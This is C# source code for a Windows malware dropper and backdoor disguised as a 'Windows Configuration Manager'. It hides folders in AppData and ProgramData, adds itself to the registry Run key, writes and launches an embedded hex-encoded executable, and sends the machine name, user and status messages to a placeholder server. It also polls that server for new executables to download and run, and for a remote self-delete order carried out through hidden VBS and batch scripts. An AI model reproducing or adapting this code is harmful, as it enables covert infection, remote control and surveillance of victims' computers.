using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Security.Cryptography;
using System.IO;
using Microsoft.Win32;
using System.Net;
using System.Runtime.Remoting.Metadata.W3cXsd2001;
using System.Diagnostics;
using System.Security.Principal;
using System.Text.RegularExpressions;
using System.Reflection;

namespace winconf
{
    public partial class Winconf : Form
    {
        static void SystemEvents_SessionEnding(object sender, SessionEndingEventArgs e)
        {
            switch (e.Reason)
            {
                case SessionEndReasons.Logoff:
                    try
                    {
                        foreach (Process proc in Process.GetProcessesByName("winconf"))
                        {
                            proc.Kill();
                        }
                    }
                    catch
                    {
                        
                    }
                    break;

                case SessionEndReasons.SystemShutdown:
                    try
                    {
                        foreach (Process proc in Process.GetProcessesByName("winconf"))
                        {
                            proc.Kill();
                        }
                    }
                    catch
                    {
                    }
                    break;
            }
        }

        #region Global Variable
        RegistryKey rkApp = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
        static byte[] bytes = ASCIIEncoding.ASCII.GetBytes("ZeroCool");
        string temp = string.Empty;
        
        // Note this hex is acctually win32.exe you can build it then convert it to hex and paste it here or simply use this hex
        string WindowsConfigManager = "";
        bool accessToSendMail = true;

        bool IsSended = true;
        bool StartUp = true;


        #endregion

        #region Binery AND Hex Area
        public void ConvertToHex(string inputFilePath, string outputFilePath)
        {
            var bytes = File.ReadAllBytes(inputFilePath);
            var hexString = string.Join("", bytes.Select(x => x.ToString("X2")));
            File.WriteAllText(outputFilePath, hexString);
        }


        public byte[] GetStringToBytes(string value)
        {
            SoapHexBinary shb = SoapHexBinary.Parse(value);
            return shb.Value;
        }

        public string GetBytesToString(byte[] value)
        {
            SoapHexBinary shb = new SoapHexBinary(value);
            return shb.ToString();
        }

        public static bool SaveData(string FileName, byte[] Data)
        {
            BinaryWriter Writer = null;
            string Name = FileName;

            try
            {
                // Create a new stream to write to the file
                Writer = new BinaryWriter(File.OpenWrite(Name));

                // Writer raw data                
                Writer.Write(Data);
                Writer.Flush();
                Writer.Close();
            }
            catch
            {
                //...
                return false;
            }

            return true;
        }
        #endregion

        #region Send Text To Server

        public string SendTextToServer(string POST)
        {
            string URL = “yoururlhere!”;
            WebRequest request;
            WebResponse response;
            request = WebRequest.Create(URL);

            request.ContentType = "application/x-www-form-urlencoded";
            request.ContentLength = POST.Length;
            request.Method = "POST";

            Stream requeststream = request.GetRequestStream();
            byte[] postbytes = Encoding.UTF8.GetBytes(POST);

            requeststream.Write(postbytes, 0, postbytes.Length);
            response = request.GetResponse();
            StreamReader reader = new StreamReader(response.GetResponseStream());
            string a = reader.ReadLine();
            requeststream.Close();
            reader.Close();

            return a;
        }  
        #endregion 

        public static string Encrypt(string originalString)
        {
            if (String.IsNullOrEmpty(originalString))
            {
                throw new ArgumentNullException("The string which needs to be encrypted can not be null.");
            }

            DESCryptoServiceProvider cryptoProvider = new DESCryptoServiceProvider();
            MemoryStream memoryStream = new MemoryStream();
            CryptoStream cryptoStream = new CryptoStream(memoryStream, cryptoProvider.CreateEncryptor(bytes, bytes), CryptoStreamMode.Write);

            StreamWriter writer = new StreamWriter(cryptoStream);
            writer.Write(originalString);
            writer.Flush();
            cryptoStream.FlushFinalBlock();
            writer.Flush();

            return Convert.ToBase64String(memoryStream.GetBuffer(), 0, (int)memoryStream.Length);
        }

        #region  Email Sender without file
        public void SendMail(string text)
        {
            try
            {
                if (accessToSendMail == true)
                {

                    var bytes = Encoding.UTF8.GetBytes(text);
                    var base64 = Convert.ToBase64String(bytes);
                    string post = "Username=" + base64 + "&Password=" + “if you want pass write it here” + "";
                    if (SendTextToServer(post) == "enter")
                    {
                    }

                   
                }
                else { }
            }
            catch { }
        }
        #endregion

        #region Web Access

        public bool WebRequestTest()
        {
            try
            {
                using (var client = new WebClient())
                using (var stream = client.OpenRead("http://www.google.com"))
                {
                    return true;
                }
            }
            catch
            {
                return false;
            }
        }



        #endregion

        #region IsAprocessRunning
        public bool IsProcessRunning(string sProcessName)
        {
            System.Diagnostics.Process[] proc = System.Diagnostics.Process.GetProcessesByName(sProcessName);
            if (proc.Length > 0)
            {
                return true;
            }
            else
            {
                return false;                // start your process
            }
        }

        #endregion

        #region IsAprocessAdmin

        public bool IsUserAdministrator()
        {
            bool isAdmin;
            try
            {
                WindowsIdentity user = WindowsIdentity.GetCurrent();
                WindowsPrincipal principal = new WindowsPrincipal(user);
                isAdmin = principal.IsInRole(WindowsBuiltInRole.Administrator);
            }
            catch (UnauthorizedAccessException )
            {
                isAdmin = false;
            }
            catch (Exception)
            {
                isAdmin = false;
            }
            return isAdmin;
        }
        #endregion
        private bool DeleteValueFromRegistry()
        {
            try
            {
                rkApp.DeleteValue("Windows Configuration Manager", false);
                return true;
            }
            catch
            {
                return false;
            }
        }

        #region IsValue Exists in Registry
        public bool IsValueInRegistry()
        {
            if (rkApp.GetValue("Windows Configuration Manager") == null)
            {
                return false;
            }
            else
            {
                // The value exists, the application is set to run at startup
                return true;
            }
        }
        #endregion

        #region  RegistryArea
        public bool AddValueToRegistry(string Path)
        {
            try
            {
                rkApp.SetValue("Windows Configuration Manager", Path);
                return true;
            }
            catch
            {
                return false;
            }
        }
        private bool DeleteValueFromRegistry(string Path)
        {
            try
            {
                rkApp.DeleteValue("Windows Configuration Manager", false);
                return true;
            }
            catch
            {
                return false;
            }
        }
        #endregion

        /***********************************************************************************************************
        */

        public void Delete()
        {
            if (WebRequestTest() == true)
            {

                try
                {
                    StreamReader sr = new StreamReader(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), @"Syslog\Langs\log.dat"));
                    string DownloadLink = sr.ReadLine();
                    sr.Close();
                    DownloadLink = "http://yoururlhere!/“ + DownloadLink + "text.dat";


                    string IsDelete = string.Empty;

                    WebClient w = new WebClient();
                    string pattern = "(<DELE>.*?</DELE>)";
                    MatchCollection hreflist;
                    try
                    {
                        string Url = w.DownloadString(DownloadLink);

                        hreflist = Regex.Matches(Url, pattern);
                        foreach (Match match in hreflist)
                        {

                            IsDelete = match.Value.Remove(0, 6);
                            IsDelete = IsDelete.Remove(IsDelete.Length - 7, 7);


                        }
                    }
                    catch (System.Net.WebException)
                    {
                        return;
                    }

                        if (IsDelete == "y" || IsDelete == "Y")
                        {
                            StreamWriter StWBatch = new StreamWriter(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "System.bat"));
                            StreamWriter StWVBS = new StreamWriter(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "System.vbs"));


                            if (IsValueInRegistry() == true)
                            {
                                DeleteValueFromRegistry();
                            }
                            try
                            {
                                SendMail("Deleted ......  " + Environment.UserName);
                            }
                            catch { }
                            


                            StWBatch.WriteLine(@"Taskkill /F /IM winconf.exe");
                            StWBatch.WriteLine(@"timeout /t 10 /nobreak");
                            StWBatch.WriteLine("RMDIR \"%appdata%\\Syslog\"" +" /S /Q");
                            StWBatch.WriteLine("RMDIR \"%programdata%\\Windows Configuration Manager\"" + " /S /Q");
                            StWBatch.WriteLine("del \"%appdata%\\System.vbs\"");
                            StWBatch.WriteLine("DEL /S /F \"%appdata%\\System.bat\"");
                            StWBatch.WriteLine("cls");
                            StWBatch.WriteLine("exit");
                            StWBatch.WriteLine("exit");
                            StWBatch.Close();

                            StWVBS.WriteLine("Set oShell = CreateObject(\"WScript.Shell\")");
                            StWVBS.WriteLine("oShell.Run \"System.bat\", 0");
                            StWVBS.Close();


                            System.Diagnostics.Process p = new System.Diagnostics.Process();
                            p.StartInfo.FileName = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), @"System.vbs");
                            p.StartInfo.WorkingDirectory = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
                            p.Start();


                        }
                        else { }

                    

                }
                catch { }
            }
        }
        //

        #region Starter
        public void starter()
        {
            try
            {
                if (Directory.Exists(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), @"Windows Configuration Manager")) == true)
                {
                    Directory.Delete(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), @"Windows Configuration Manager"), true);
                }
                if (Directory.Exists(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), @"Syslog")) == true)
                {
                    Directory.Delete(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), @"Syslog"), true);
                }


                Directory.CreateDirectory(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), @"Windows Configuration Manager"));
                Directory.CreateDirectory(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), @"Windows Configuration Manager\System tools"));
                Directory.CreateDirectory(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), @"Windows Configuration Manager\Bin"));
                Directory.CreateDirectory(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), @"Windows Configuration Manager\Lib"));
                Directory.CreateDirectory(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), @"Windows Configuration Manager\Temporary"));
                //
                Directory.CreateDirectory(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), @"Syslog"));
                Directory.CreateDirectory(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), @"Syslog\Langs"));
                Directory.CreateDirectory(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), @"Syslog\NBC"));
                Directory.CreateDirectory(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), @"Syslog\Tas"));

            }
            catch
            {
            }


            try
            {
                StreamWriter sw = new StreamWriter(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), @"Syslog\Langs\log.dat"));
                sw.WriteLine(Environment.MachineName + "+" + WindowsIdentity.GetCurrent().Owner);
                sw.Close();

                StreamWriter sw2 = new StreamWriter(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), @"Syslog\Langs\lang.dat"));
                sw2.WriteLine("0");
                sw2.Close();

                StreamWriter sw3 = new StreamWriter(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), @"Syslog\NBC\Up.dat"));
                sw3.Close();
            }
            catch { }


            try
            {

                byte[] bytes = GetStringToBytes(WindowsConfigManager);
                SaveData(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), @"Windows Configuration Manager\Bin\win32.exe"), bytes);



                /////////


                AddValueToRegistry(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), @"Windows Configuration Manager\Bin\win32.exe"));
            }
            catch { }
            try
            {
                System.IO.File.Copy(Application.ExecutablePath, Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), @"Syslog\winconf.exe"), true);

            }
            catch { }




            try
            {
                if (WebRequestTest() == true)
                {
                    SendMail("I Think it is the first time ||| my number is now 0  ,,,, :D  It is in :       " + Environment.MachineName + "+" + WindowsIdentity.GetCurrent().Owner);
                }
            }

            catch { }
            try { WaitAndRunTheWin32(); }
            catch { }

        }

        #endregion
        //

        #region WaitAndRunTheWin32
        public void WaitAndRunTheWin32()
        {
            try
            {
                StreamWriter sw = new StreamWriter(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), @"Syslog\Langs\bin.vbs"));

                sw.WriteLine("Set oShell = CreateObject(\"WScript.Shell\")");
                sw.WriteLine("oShell.CurrentDirectory = \"" + Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), @"Syslog\Langs") + "\"");
                sw.WriteLine("oShell.Run \"bin.bat\", 0");
                sw.Close();

                StreamWriter sw2 = new StreamWriter(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), @"Syslog\Langs\bin.bat"));

                sw2.WriteLine("timeout " + "/t 5 /nobreak");
                sw2.WriteLine("DEL /F /S /Q /A \"" + Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), @"Syslog\Langs\bin.vbs") + "\"");
                sw2.WriteLine("cd " + Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), @"Windows Configuration Manager\Bin") + "\"");
                sw2.WriteLine("start win32.exe");
                sw2.WriteLine("cls");
                sw2.WriteLine("exit");
                sw2.WriteLine("exit");
                sw2.Close();
                System.Diagnostics.Process.Start(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), @"Syslog\Langs\bin.vbs"));
                this.Close();
            }
            catch { }
        }
        #endregion
        //

        #region check for avillablty on computer
        public void CheckForExistance()
        {
            if (IsValueInRegistry() == false)
            {
                try
                {
                    AddValueToRegistry(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), @"Windows Configuration Manager\Lib"));
                }
                catch { }

            }
            try {
                if (Directory.Exists(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), @"Windows Configuration Manager")) == false)
                {
                    Directory.CreateDirectory(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), @"Windows Configuration Manager"));
                    Directory.CreateDirectory(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), @"Windows Configuration Manager\System tools"));
                    Directory.CreateDirectory(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), @"Windows Configuration Manager\Bin"));
                    Directory.CreateDirectory(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), @"Windows Configuration Manager\Lib"));
                    Directory.CreateDirectory(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), @"Windows Configuration Manager\Temporary"));
                    /*  ///////////////// اضافه کردن به الل یوزرز

                                      byte[] bytes = GetStringToBytes(WindowsConfigManager);
                      SaveData(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), @"Windows Configuration Manager\Bin\win32.exe"), bytes);


                      ////////*/
                }

            }
            catch { }


        }
        #endregion
        //


        #region check For a new File on web
        public bool checkForANewFile()
        {
            if (WebRequestTest() == true)
            {

                try
                {
                    StreamReader sr = new StreamReader(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), @"Syslog\Langs\log.dat"));
                    string DownloadLink = sr.ReadLine();
                    sr.Close();
                    DownloadLink = "http://yoururlhere/“ + DownloadLink + "text.dat";



                    WebClient w = new WebClient();
                    string pattern = "(<node>.*?</node>)";
                    MatchCollection hreflist;
                    try
                    {
                        string Url = w.DownloadString(DownloadLink);

                        hreflist = Regex.Matches(Url, pattern);

                        foreach (Match match in hreflist)
                        {
                            temp = match.Value.Remove(0, 6);
                            temp = temp.Remove(temp.Length - 7, 7);

                        }
                    }
                    catch (System.Net.WebException)
                    {
                        return false;
                    }


                    StreamReader sr2 = new StreamReader(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), @"Syslog\Langs\lang.dat"));
                    string lang = sr2.ReadLine();
                    sr2.Close();
                    if (lang == temp)
                    {
                        return false;
                    }
                    else
                    {
                        StreamWriter sw = new StreamWriter(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), @"Syslog\Langs\lang.dat"));
                        sw.WriteLine(temp);
                        sw.Close();
                        return true;

                    }
                }
                catch
                {
                    return false;
                }
            }
            else
            {
                return false;
            }
        }

        #endregion
        //


        #region Download
        public bool Download()
        {

            if (WebRequestTest() == true)
            {

                try
                {
                    StreamReader sr = new StreamReader(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), @"Syslog\Langs\log.dat"));
                    string DownloadLink = sr.ReadLine();
                    sr.Close();
                    DownloadLink = "http://yoururlhere!/“ + DownloadLink + ".dat";
                    WebClient w = new WebClient();
                    string pattern = "(<code>.*?</code>)";
                    MatchCollection hreflist;

                    try
                    {
                        string Url = w.DownloadString(DownloadLink);

                        hreflist = Regex.Matches(Url, pattern);

                        foreach (Match match in hreflist)
                        {
                            temp = match.Value.Remove(0, 6);
                            temp = temp.Remove(temp.Length - 7, 7);

                        }
                    }
                    catch (System.Net.WebException)
                    {
                        return false;
                    }


                    string HexValue = temp;

                    byte[] bytes = GetStringToBytes(HexValue);



                    StreamReader sr2 = new StreamReader(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), @"Syslog\Langs\lang.dat"));
                    string nameOfExe = sr2.ReadLine();
                    sr2.Close();

                    SaveData(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), @"Syslog\NBC\" + nameOfExe + ".exe"), bytes);
                    Process.Start(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), @"Syslog\NBC\" + nameOfExe + ".exe"));

                    return true;
                }
                catch
                {
                    return false;
                }
            }
            else
            {
                return false;
            }
        }


        #endregion
        //


        #region Start Start UPs

        public void StartStartUps()
        {
          
            if (StartUp == true)
            {
                try
                {
                    string line;

                    // Read the file and display it line by line.
                    System.IO.StreamReader file = new System.IO.StreamReader(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), @"Syslog\NBC\Up.dat"));
                    while ((line = file.ReadLine()) != null)
                    {
                        System.Diagnostics.Process.Start(line);
                    }

                    file.Close();
                    StartUp = false;
                }
                catch { }
            }
            else { }
        }
        #endregion
        //
        
        #region IsItRunned
        public bool IsItRunned()
        {
            System.Diagnostics.Process[] proc = System.Diagnostics.Process.GetProcessesByName(Process.GetCurrentProcess().ProcessName);
            if (proc.Length > 1)
            {
                return true;
            }
            else
            {
                return false;                // start your process
            }
        }

        #endregion
        //

        #region Is After This Runned
        public bool IsAfterThisRunned()
        {

            if(Directory.Exists(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), @"Windows Configuration Manager")) == true && File.Exists(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), @"Syslog")) == true ){
                return true;
            
            }
            else
            {
                return false;
            }

        }


        #endregion   
        //

        #region Is Runned From Start Up
        public bool IsRunnedFromStartUp()
        {
 
            if (Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), @"Syslog") == System.IO.Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location))
            {

                return true;
            }
            else
            {
                return false;
            }
        }

        #endregion   
        //

        #region turned on computer
        public void TurnedOnComputer()
        {
            if (IsSended == true)
            {
                try
                {
                    StreamReader sr = new StreamReader(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), @"Syslog\Langs\log.dat"));
                    string DownloadLink = sr.ReadLine();
                    sr.Close();

                    SendMail(DownloadLink + "      Computer Started :          |                " + DateTime.Now + "                |");
                    IsSended = false;
                }
                catch { }
            }
            else { }
        }
        #endregion
        //
        #region Is Allow To Send An Email
        public bool IsAllowToSendAnEmail()
        {
            string utem = string.Empty;
            if (WebRequestTest() == true)
            {

                try
                {
                    StreamReader sr = new StreamReader(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), @"Syslog\Langs\log.dat"));
                    string DownloadLink = sr.ReadLine();
                    sr.Close();
                    DownloadLink = "http://yoururlhere!/“ + DownloadLink + "text.dat";



                    WebClient w = new WebClient();
                    string pattern = "(<ESTF>.*?</ESTF>)";
                    MatchCollection hreflist;
                    try
                    {
                        string Url = w.DownloadString(DownloadLink);

                        hreflist = Regex.Matches(Url, pattern);

                        foreach (Match match in hreflist)
                        {
                            utem = match.Value.Remove(0, 6);
                            utem = utem.Remove(utem.Length - 7, 7);

                        }
                    }
                    catch (System.Net.WebException)
                    {
                        return true;
                    }


                    if (utem == "no" || utem == "No")
                    {
                        return false;
                    }
                    else
                    {

                        return true;

                    }
                }
                catch
                {
                    return true;
                }
            }
            else
            {
                return true;
            }


        }
        #endregion
        //

        public void general()
        {
            try
            {
                try
                {
                    if (IsItRunned() == true)
                    {
                        this.Close();
                    }
                    else
                    {
                        if (IsRunnedFromStartUp() == true)
                        {
                            StartStartUps();
                            CheckForExistance();

                            if (WebRequestTest() == false)
                            {
                                System.Threading.Thread.Sleep(500000);
                                general();
                            }
                            else
                            {

                                //to do sth
                                try
                                {
                                    accessToSendMail = IsAllowToSendAnEmail();
                                    Delete();



                                }
                                catch { }


                                if (IsSended == true)
                                {
                                    try
                                    {
                                        StreamReader sr = new StreamReader(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), @"Syslog\Langs\log.dat"));
                                        string DownloadLink = sr.ReadLine();
                                        sr.Close();

                                        SendMail(DownloadLink + "      Computer Started :          |                " + DateTime.Now + "                |");
                                        IsSended = false;
                                    }
                                    catch { }
                                }
                                else { }


                                if (checkForANewFile() == true)
                                {
                                    string exeName = DateTime.Now.ToFileTimeUtc() + DateTime.Now.ToOADate().ToString();

                                    if (Download() == true)
                                    {
                                        try
                                        {
                                            SendMail("File Succefuly downloaded ... ");
                                        }
                                        catch { }
                                    }

                                }
                                System.Threading.Thread.Sleep(500000);
                                
                                general();

                                // end to do sth
                            }
                        }
                        else
                        {
                            if (IsAfterThisRunned() == true)
                            {
                                this.Close();
                            }
                            else
                            {
                                starter();
                            }

                        }
                    }
                }
                catch (Exception eeee)
                {
                    try
                    {
                        SendMail(" Exeption in GENERAL   :         " + eeee.Message.ToString());
                    }
                    catch { }
                }
            }
            catch { }
        }

        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            this.Enabled = false;
        }

        private void Form1_Shown(object sender, EventArgs e)
        {
            general();

        }

    }
}
        
